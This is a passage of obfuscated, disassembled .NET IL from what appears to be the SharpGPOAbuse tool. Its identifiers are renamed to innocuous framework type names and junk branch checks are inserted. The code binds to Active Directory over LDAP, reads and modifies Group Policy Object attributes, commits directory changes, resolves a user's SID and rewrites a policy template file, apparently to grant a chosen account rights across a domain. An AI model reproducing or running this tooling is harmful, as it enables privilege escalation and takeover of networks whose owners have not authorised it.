      IL_0be7:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_0bec:  ldloc.s    V_67
      IL_0bee:  ldc.i4.1
      IL_0bef:  add
      IL_0bf0:  stloc.s    V_67
      IL_0bf2:  ldloc.s    V_67
      IL_0bf4:  ldloc.s    V_66
      IL_0bf6:  ldlen
      IL_0bf7:  conv.i4
      IL_0bf8:  blt.s      IL_0bdc

      IL_0bfa:  ldloc.s    V_64
      IL_0bfc:  ldloc.s    V_13
      IL_0bfe:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_0c03:  ldloc.s    V_64
      IL_0c05:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Sort()
      IL_0c0a:  ldloc.s    V_51
      IL_0c0c:  ldloc.s    V_62
      IL_0c0e:  ldloc.s    V_66
      IL_0c10:  ldc.i4.0
      IL_0c11:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0c16:  ldlen
      IL_0c17:  add
      IL_0c18:  ldelem     [mscorlib]System.String
      IL_0c1d:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::set_Item(int32,
                                                                                                             !0)
      IL_0c22:  ldloc.s    V_64
      IL_0c24:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<string>::GetEnumerator()
      IL_0c29:  stloc.s    V_23
      .try
      {
        IL_0c2b:  br         IL_0c7f

        IL_0c30:  ldloca.s   V_23
        IL_0c32:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::get_Current()
        IL_0c37:  stloc.s    V_68
        IL_0c39:  ldloc.s    V_51
        IL_0c3b:  stloc.s    V_25
        IL_0c3d:  ldloc.s    V_62
        IL_0c3f:  stloc.s    V_6
        IL_0c41:  ldloc.s    V_25
        IL_0c43:  ldloc.s    V_6
        IL_0c45:  ldloc.s    V_25
        IL_0c47:  ldc.i4     0x69bea97d
        IL_0c4c:  stloc.s    V_69
        IL_0c4e:  ldloc.s    V_69
        IL_0c50:  ldc.i4     0x71b10eec
        IL_0c55:  beq        IL_0c60

        IL_0c5a:  ldarg.0
        IL_0c5b:  br         IL_0c69

        IL_0c60:  nop
        IL_0c61:  ldloc.s    V_6
        IL_0c63:  br         IL_0c69

        IL_0c68:  nop
        IL_0c69:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
        IL_0c6e:  ldsfld     string AppDomain
        IL_0c73:  ldloc.s    V_68
        IL_0c75:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0c7a:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::set_Item(int32,
                                                                                                               !0)
        IL_0c7f:  ldloca.s   V_23
        IL_0c81:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::MoveNext()
        IL_0c86:  brtrue.s   IL_0c30

        IL_0c88:  leave      IL_0c9b

      }  // end .try
      finally
      {
        IL_0c8d:  ldloca.s   V_23
        IL_0c8f:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>
        IL_0c95:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0c9a:  endfinally
      }  // end handler
      IL_0c9b:  ldloc.s    V_62
      IL_0c9d:  ldc.i4.1
      IL_0c9e:  call       int32 '<Module>'(int32)
      IL_0ca3:  add
      IL_0ca4:  stloc.s    V_62
      IL_0ca6:  ldloc.s    V_62
      IL_0ca8:  ldc.i4     0x5f83d8e9
      IL_0cad:  stloc.s    V_70
      IL_0caf:  ldloc.s    V_70
      IL_0cb1:  ldc.i4     0x6371ceb2
      IL_0cb6:  beq        IL_0cc1

      IL_0cbb:  ldarg.0
      IL_0cbc:  br         IL_0cca

      IL_0cc1:  nop
      IL_0cc2:  ldloc.s    V_51
      IL_0cc4:  br         IL_0cca

      IL_0cc9:  nop
      IL_0cca:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<string>::get_Count()
      IL_0ccf:  blt        IL_0b5e

      IL_0cd4:  ldloc.s    V_51
      IL_0cd6:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Sort()
      IL_0cdb:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_0ce0:  stloc.s    V_71
      IL_0ce2:  ldc.i4.0
      IL_0ce3:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0ce8:  ldlen
      IL_0ce9:  sub
      IL_0cea:  stloc.s    V_72
      IL_0cec:  br         IL_0dd8

      IL_0cf1:  ldloc.s    V_51
      IL_0cf3:  ldc.i4     0x492cdc69
      IL_0cf8:  stloc.s    V_73
      IL_0cfa:  ldloc.s    V_73
      IL_0cfc:  ldc.i4     0x58b46e25
      IL_0d01:  beq        IL_0d0c

      IL_0d06:  ldarg.0
      IL_0d07:  br         IL_0d15

      IL_0d0c:  nop
      IL_0d0d:  ldloc.s    V_72
      IL_0d0f:  br         IL_0d15

      IL_0d14:  nop
      IL_0d15:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_0d1a:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
      IL_0d1f:  brtrue     IL_0d24

      IL_0d24:  ldloc.s    V_51
      IL_0d26:  ldc.i4     0x2bf7ee35
      IL_0d2b:  stloc.s    V_74
      IL_0d2d:  ldloc.s    V_74
      IL_0d2f:  ldc.i4     0x46dcd049
      IL_0d34:  beq        IL_0d3f

      IL_0d39:  ldarg.0
      IL_0d3a:  br         IL_0d48

      IL_0d3f:  nop
      IL_0d40:  ldloc.s    V_72
      IL_0d42:  br         IL_0d48

      IL_0d47:  nop
      IL_0d48:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_0d4d:  call       !!0[] [mscorlib]System.Array::Empty<char>()
      IL_0d52:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_0d57:  stloc.s    V_75
      IL_0d59:  ldsfld     string CrossAppDomainDelegate
      IL_0d5e:  stloc.s    V_76
      IL_0d60:  ldc.i4.0
      IL_0d61:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0d66:  ldlen
      IL_0d67:  sub
      IL_0d68:  stloc.s    V_77
      IL_0d6a:  br         IL_0da9

      IL_0d6f:  ldloc.s    V_75
      IL_0d71:  ldloc.s    V_77
      IL_0d73:  ldelem     [mscorlib]System.String
      IL_0d78:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
      IL_0d7d:  brtrue     IL_0d9e

      IL_0d82:  ldloc.s    V_76
      IL_0d84:  ldsfld     string AppDomainManagerInitializationOptions
      IL_0d89:  ldloc.s    V_75
      IL_0d8b:  ldloc.s    V_77
      IL_0d8d:  ldelem     [mscorlib]System.String
      IL_0d92:  ldsfld     string AppDomainManager
      IL_0d97:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0d9c:  stloc.s    V_76
      IL_0d9e:  ldloc.s    V_77
      IL_0da0:  ldc.i4.1
      IL_0da1:  call       int32 '<Module>'(int32)
      IL_0da6:  add
      IL_0da7:  stloc.s    V_77
      IL_0da9:  ldloc.s    V_77
      IL_0dab:  ldloc.s    V_75
      IL_0dad:  ldlen
      IL_0dae:  conv.i4
      IL_0daf:  blt.s      IL_0d6f

      IL_0db1:  ldsfld     string IAppDomainSetup
      IL_0db6:  ldloc.s    V_76
      IL_0db8:  ldsfld     string AppDomainSetup
      IL_0dbd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0dc2:  stloc.s    V_76
      IL_0dc4:  ldloc.s    V_71
      IL_0dc6:  ldloc.s    V_76
      IL_0dc8:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_0dcd:  ldloc.s    V_72
      IL_0dcf:  ldc.i4.1
      IL_0dd0:  call       int32 '<Module>'(int32)
      IL_0dd5:  add
      IL_0dd6:  stloc.s    V_72
      IL_0dd8:  ldloc.s    V_72
      IL_0dda:  ldc.i4     0x3520082d
      IL_0ddf:  stloc.s    V_78
      IL_0de1:  ldloc.s    V_78
      IL_0de3:  ldc.i4     0x6f975e32
      IL_0de8:  beq        IL_0df3

      IL_0ded:  ldarg.0
      IL_0dee:  br         IL_0dfc

      IL_0df3:  nop
      IL_0df4:  ldloc.s    V_51
      IL_0df6:  br         IL_0dfc

      IL_0dfb:  nop
      IL_0dfc:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<string>::get_Count()
      IL_0e01:  blt        IL_0cf1

      IL_0e06:  ldsfld     string LoaderOptimization
      IL_0e0b:  ldloc.s    V_71
      IL_0e0d:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<string>::ToArray()
      IL_0e12:  call       string [mscorlib]System.String::Join(string,
                                                                string[])
      IL_0e17:  stloc.s    V_79
      IL_0e19:  ldloc.s    V_11
      IL_0e1b:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_0e20:  ldloc.s    V_4
      IL_0e22:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_0e27:  ldloc.s    V_79
      IL_0e29:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::set_Value(object)
      IL_0e2e:  leave      IL_0e94

    }  // end .try
    catch [mscorlib]System.Object 
    {
      IL_0e33:  pop
      IL_0e34:  ldloc.s    V_11
      IL_0e36:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_0e3b:  ldloc.s    V_4
      IL_0e3d:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_0e42:  ldc.i4.s   9
      IL_0e44:  newarr     [mscorlib]System.String
      IL_0e49:  dup
      IL_0e4a:  ldc.i4.0
      IL_0e4b:  ldsfld     string _Attribute
      IL_0e50:  stelem.ref
      IL_0e51:  dup
      IL_0e52:  ldc.i4.1
      IL_0e53:  ldloc.s    V_12
      IL_0e55:  stelem.ref
      IL_0e56:  dup
      IL_0e57:  ldc.i4.2
      IL_0e58:  ldsfld     string Attribute
      IL_0e5d:  stelem.ref
      IL_0e5e:  dup
      IL_0e5f:  ldc.i4.3
      IL_0e60:  ldloc.s    V_13
      IL_0e62:  stelem.ref
      IL_0e63:  dup
      IL_0e64:  ldc.i4.4
      IL_0e65:  ldsfld     string LoaderOptimizationAttribute
      IL_0e6a:  stelem.ref
      IL_0e6b:  dup
      IL_0e6c:  ldc.i4.5
      IL_0e6d:  ldloc.s    V_49
      IL_0e6f:  stelem.ref
      IL_0e70:  dup
      IL_0e71:  ldc.i4.6
      IL_0e72:  ldsfld     string AppDomainUnloadedException
      IL_0e77:  stelem.ref
      IL_0e78:  dup
      IL_0e79:  ldc.i4.7
      IL_0e7a:  ldloc.s    V_13
      IL_0e7c:  stelem.ref
      IL_0e7d:  dup
      IL_0e7e:  ldc.i4.8
      IL_0e7f:  ldsfld     string ActivationArguments
      IL_0e84:  stelem.ref
      IL_0e85:  call       string [mscorlib]System.String::Concat(string[])
      IL_0e8a:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::set_Value(object)
      IL_0e8f:  leave      IL_0e94

    }  // end handler
    IL_0e94:  nop
    .try
    {
      IL_0e95:  ldloc.s    V_11
      IL_0e97:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::CommitChanges()
      IL_0e9c:  ldsfld     string ActivationContext
      IL_0ea1:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_0ea6:  leave      IL_0ee1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0eab:  callvirt   instance string [mscorlib]System.Exception::get_Message()
      IL_0eb0:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_0eb5:  ldsfld     string ApplicationIdentity
      IL_0eba:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_0ebf:  ldc.i4.0
      IL_0ec0:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0ec5:  ldlen
      IL_0ec6:  sub
      IL_0ec7:  call       void [mscorlib]System.Environment::Exit(int32)
      IL_0ecc:  leave      IL_0ee1

    }  // end handler
    IL_0ed1:  ldsfld     string InternalApplicationIdentityHelper
    IL_0ed6:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0edb:  ldc.i4.0
    IL_0edc:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_0ee1:  ldarg.3
    IL_0ee2:  newobj     instance void [mscorlib]System.IO.StreamReader::.ctor(string)
    IL_0ee7:  stloc.s    V_80
    .try
    {
      IL_0ee9:  br         IL_0f43

      IL_0eee:  ldloc.0
      IL_0eef:  ldsfld     string InternalActivationContextHelper
      IL_0ef4:  ldsfld     string ApplicationId
      IL_0ef9:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0efe:  ldsfld     string ArgumentException
      IL_0f03:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0f08:  brfalse    IL_0f3c

      IL_0f0d:  ldloc.0
      IL_0f0e:  ldc.i4.1
      IL_0f0f:  call       int32 '<Module>'(int32)
      IL_0f14:  newarr     [mscorlib]System.Char
      IL_0f19:  dup
      IL_0f1a:  ldc.i4.0
      IL_0f1b:  ldc.i4.s   61
      IL_0f1d:  stelem.i2
      IL_0f1e:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_0f23:  ldc.i4.1
      IL_0f24:  ldelem     [mscorlib]System.String
      IL_0f29:  stloc.0
      IL_0f2a:  ldsfld     string ArgumentNullException
      IL_0f2f:  ldloc.s    V_10
      IL_0f31:  call       string [mscorlib]System.Convert::ToString(int32)
      IL_0f36:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0f3b:  stloc.0
      IL_0f3c:  ldloc.1
      IL_0f3d:  ldloc.0
      IL_0f3e:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_0f43:  ldloc.s    V_80
      IL_0f45:  callvirt   instance string [mscorlib]System.IO.TextReader::ReadLine()
      IL_0f4a:  dup
      IL_0f4b:  stloc.0
      IL_0f4c:  brtrue.s   IL_0eee

      IL_0f4e:  leave      IL_0f62

    }  // end .try
    finally
    {
      IL_0f53:  ldloc.s    V_80
      IL_0f55:  brfalse    IL_0f61

      IL_0f5a:  ldloc.s    V_80
      IL_0f5c:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0f61:  endfinally
    }  // end handler
    IL_0f62:  ldarg.3
    IL_0f63:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
    IL_0f68:  stloc.s    V_81
    .try
    {
      IL_0f6a:  ldloc.1
      IL_0f6b:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<string>::GetEnumerator()
      IL_0f70:  stloc.s    V_23
      .try
      {
        IL_0f72:  br         IL_0f89

        IL_0f77:  ldloca.s   V_23
        IL_0f79:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::get_Current()
        IL_0f7e:  stloc.s    V_82
        IL_0f80:  ldloc.s    V_81
        IL_0f82:  ldloc.s    V_82
        IL_0f84:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
        IL_0f89:  ldloca.s   V_23
        IL_0f8b:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::MoveNext()
        IL_0f90:  brtrue.s   IL_0f77

        IL_0f92:  leave      IL_0fb4

      }  // end .try
      finally
      {
        IL_0f97:  ldloca.s   V_23
        IL_0f99:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>
        IL_0f9f:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0fa4:  endfinally
      }  // end handler
    }  // end .try
    finally
    {
      IL_0fa5:  ldloc.s    V_81
      IL_0fa7:  brfalse    IL_0fb3

      IL_0fac:  ldloc.s    V_81
      IL_0fae:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0fb3:  endfinally
    }  // end handler
    IL_0fb4:  ldsfld     string ArgumentOutOfRangeException
    IL_0fb9:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0fbe:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0fc0:  ldsfld     string ArgIterator
    IL_0fc5:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_0fca:  brfalse    IL_0fda

    IL_0fcf:  ldsfld     string ArithmeticException
    IL_0fd4:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0fd9:  ret

    IL_0fda:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0fdc:  ldsfld     string ArrayTypeMismatchException
    IL_0fe1:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_0fe6:  brfalse    IL_0ff6

    IL_0feb:  ldsfld     string AsyncCallback
    IL_0ff0:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0ff5:  ret

    IL_0ff6:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0ff8:  ldsfld     string AttributeTargets
    IL_0ffd:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_1002:  brfalse    IL_1012

    IL_1007:  ldsfld     string AttributeUsageAttribute
    IL_100c:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_1011:  ret

    IL_1012:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_1014:  ldsfld     string BadImageFormatException
    IL_1019:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_101e:  brfalse    IL_102d

    IL_1023:  ldsfld     string BitConverter
    IL_1028:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_102d:  ret
  } // end of method IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS

  .method public hidebysig static string 
          ISTORE_ENUM_FILES_FLAGS(string StoreOperationStageComponent,
                                  string StoreOperationStageComponentFile,
                                  string StoreApplicationReference) cil managed
  {
    // Code size       279 (0x117)
    .maxstack  25
    .locals init ([0] class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchRequest V_0,
             [1] string V_1,
             [2] class [mscorlib]System.Collections.IEnumerator V_2,
             [3] class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchResultEntry V_3,
             [4] class [mscorlib]System.IDisposable V_4)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4     0x185
    IL_0006:  newobj     instance void [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapDirectoryIdentifier::.ctor(string,
                                                                                                                                             int32)
    IL_000b:  newobj     instance void [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapConnection::.ctor(class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapDirectoryIdentifier)
    IL_0010:  dup
    IL_0011:  callvirt   instance class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapSessionOptions [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapConnection::get_SessionOptions()
    IL_0016:  ldc.i4.1
    IL_0017:  callvirt   instance void [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapSessionOptions::set_Sealing(bool)
    IL_001c:  dup
    IL_001d:  callvirt   instance class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapSessionOptions [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapConnection::get_SessionOptions()
    IL_0022:  ldc.i4.1
    IL_0023:  callvirt   instance void [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapSessionOptions::set_Signing(bool)
    IL_0028:  dup
    IL_0029:  callvirt   instance void [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.LdapConnection::Bind()
    IL_002e:  ldarg.2
    IL_002f:  ldsfld     string Boolean
    IL_0034:  ldarg.1
    IL_0035:  ldsfld     string Buffer
    IL_003a:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003f:  ldc.i4.2
    IL_0040:  ldnull
    IL_0041:  newobj     instance void [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchRequest::.ctor(string,
                                                                                                                                   string,
                                                                                                                                   valuetype [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchScope,
                                                                                                                                   string[])
    IL_0046:  stloc.0
    IL_0047:  ldloc.0
    IL_0048:  callvirt   instance class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.DirectoryResponse [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.DirectoryConnection::SendRequest(class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.DirectoryRequest)
    IL_004d:  castclass  [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchResponse
    IL_0052:  ldsfld     string Byte
    IL_0057:  stloc.1
    IL_0058:  callvirt   instance class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchResultEntryCollection [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchResponse::get_Entries()
    IL_005d:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.ReadOnlyCollectionBase::GetEnumerator()
    IL_0062:  stloc.2
    .try
    {
      IL_0063:  br         IL_00b9

      IL_0068:  ldloc.2
      IL_0069:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
      IL_006e:  castclass  [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchResultEntry
      IL_0073:  stloc.3
      .try
      {
        IL_0074:  ldloc.3
        IL_0075:  callvirt   instance class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchResultAttributeCollection [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchResultEntry::get_Attributes()
        IL_007a:  ldsfld     string CannotUnloadAppDomainException
        IL_007f:  callvirt   instance class [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.DirectoryAttribute [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.SearchResultAttributeCollection::get_Item(string)
        IL_0084:  ldc.i4.0
        IL_0085:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
        IL_008a:  ldlen
        IL_008b:  add
        IL_008c:  callvirt   instance object [System.DirectoryServices.Protocols]System.DirectoryServices.Protocols.DirectoryAttribute::get_Item(int32)
        IL_0091:  callvirt   instance string [mscorlib]System.Object::ToString()
        IL_0096:  stloc.1
        IL_0097:  leave      IL_00b9

      }  // end .try
      catch [mscorlib]System.Object 
      {
        IL_009c:  pop
        IL_009d:  ldsfld     string Char
        IL_00a2:  call       void [mscorlib]System.Console::WriteLine(string)
        IL_00a7:  ldc.i4.0
        IL_00a8:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
        IL_00ad:  ldlen
        IL_00ae:  sub
        IL_00af:  call       void [mscorlib]System.Environment::Exit(int32)
        IL_00b4:  leave      IL_00b9

      }  // end handler
      IL_00b9:  ldloc.2
      IL_00ba:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_00bf:  brtrue.s   IL_0068

      IL_00c1:  leave      IL_00dd

    }  // end .try
    finally
    {
      IL_00c6:  ldloc.2
      IL_00c7:  isinst     [mscorlib]System.IDisposable
      IL_00cc:  stloc.s    V_4
      IL_00ce:  ldloc.s    V_4
      IL_00d0:  brfalse    IL_00dc

      IL_00d5:  ldloc.s    V_4
      IL_00d7:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00dc:  endfinally
    }  // end handler
    IL_00dd:  ldloc.1
    IL_00de:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_00e3:  brfalse    IL_00ff

    IL_00e8:  ldsfld     string CharEnumerator
    IL_00ed:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_00f2:  ldc.i4.0
    IL_00f3:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_00f8:  ldlen
    IL_00f9:  sub
    IL_00fa:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_00ff:  ldsfld     string ConfigEvents
    IL_0104:  ldarg.1
    IL_0105:  ldsfld     string ConfigNodeType
    IL_010a:  ldloc.1
    IL_010b:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0110:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0115:  ldloc.1
    IL_0116:  ret
  } // end of method IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::ISTORE_ENUM_FILES_FLAGS

  .method public hidebysig static void  StoreOperationPinDeployment(string StoreOperationUnpinDeployment,
                                                                    string StoreOperationInstallDeployment,
                                                                    string StoreOperationUninstallDeployment,
                                                                    string StoreOperationMetadataProperty,
                                                                    string StoreOperationSetDeploymentMetadata,
                                                                    bool StoreOperationSetCanonicalizationContext) cil managed
  {
    // Code size       1178 (0x49a)
    .maxstack  31
    .locals init ([0] class [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.PrincipalContext V_0,
             [1] class [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.UserPrincipal V_1,
             [2] string V_2,
             [3] string V_3,
             [4] string[] V_4,
             [5] string V_5,
             [6] string V_6,
             [7] bool V_7,
             [8] string[] V_8,
             [9] string[] V_9,
             [10] int32 V_10,
             [11] class [mscorlib]System.IO.StreamWriter V_11,
             [12] string V_12,
             [13] class [mscorlib]System.IO.StreamWriter V_13,
             [14] string V_14,
             [15] string V_15,
             [16] string V_16,
             [17] string V_17)
    IL_0000:  ldc.i4.1
    IL_0001:  call       int32 '<Module>'(int32)
    IL_0006:  ldarg.2
    IL_0007:  newobj     instance void [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.PrincipalContext::.ctor(valuetype [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.ContextType,
                                                                                                                                                      string)
    IL_000c:  stloc.0
    IL_000d:  ldnull
    IL_000e:  stloc.1
    .try
    {
      IL_000f:  ldloc.0
      IL_0010:  ldc.i4.0
      IL_0011:  ldarg.0
      IL_0012:  call       class [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.UserPrincipal [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.UserPrincipal::FindByIdentity(class [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.PrincipalContext,
                                                                                                                                                                                                                                                           valuetype [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.IdentityType,
                                                                                                                                                                                                                                                           string)
      IL_0017:  stloc.1
      IL_0018:  ldsfld     string ConfigNodeSubType
      IL_001d:  ldarg.0
      IL_001e:  ldsfld     string IConfigHandler
      IL_0023:  ldloc.1
      IL_0024:  callvirt   instance class [mscorlib]System.Security.Principal.SecurityIdentifier [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.Principal::get_Sid()
      IL_0029:  callvirt   instance string [mscorlib]System.Security.Principal.IdentityReference::get_Value()
      IL_002e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0033:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_0038:  leave      IL_0080

    }  // end .try
    catch [mscorlib]System.Object 
    {
      IL_003d:  pop
      IL_003e:  ldc.i4.5
      IL_003f:  newarr     [mscorlib]System.String
      IL_0044:  dup
      IL_0045:  ldc.i4.0
      IL_0046:  ldsfld     string ConfigServer
      IL_004b:  stelem.ref
      IL_004c:  dup
      IL_004d:  ldc.i4.1
      IL_004e:  ldarg.0
      IL_004f:  stelem.ref
      IL_0050:  dup
      IL_0051:  ldc.i4.2
      IL_0052:  ldsfld     string ConfigTreeParser
      IL_0057:  stelem.ref
      IL_0058:  dup
      IL_0059:  ldc.i4.3
      IL_005a:  ldarg.1
      IL_005b:  stelem.ref
      IL_005c:  dup
      IL_005d:  ldc.i4.4
      IL_005e:  ldsfld     string ConfigNode
      IL_0063:  stelem.ref
      IL_0064:  call       string [mscorlib]System.String::Concat(string[])
      IL_0069:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_006e:  ldc.i4.0
      IL_006f:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0074:  ldlen
      IL_0075:  sub
      IL_0076:  call       void [mscorlib]System.Environment::Exit(int32)
      IL_007b:  leave      IL_0080

    }  // end handler
    IL_0080:  ldarg.2
    IL_0081:  ldarg.3
    IL_0082:  ldarg.s    StoreOperationSetDeploymentMetadata
    IL_0084:  call       string SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::ISTORE_ENUM_FILES_FLAGS(string,
                                                                                                                            string,
                                                                                                                            string)
    IL_0089:  stloc.2
    IL_008a:  ldsfld     string CLSCompliantAttribute
    IL_008f:  stloc.3
    IL_0090:  ldc.i4.3
    IL_0091:  newarr     [mscorlib]System.String
    IL_0096:  dup
    IL_0097:  ldc.i4.0
    IL_0098:  ldsfld     string TypeUnloadedException
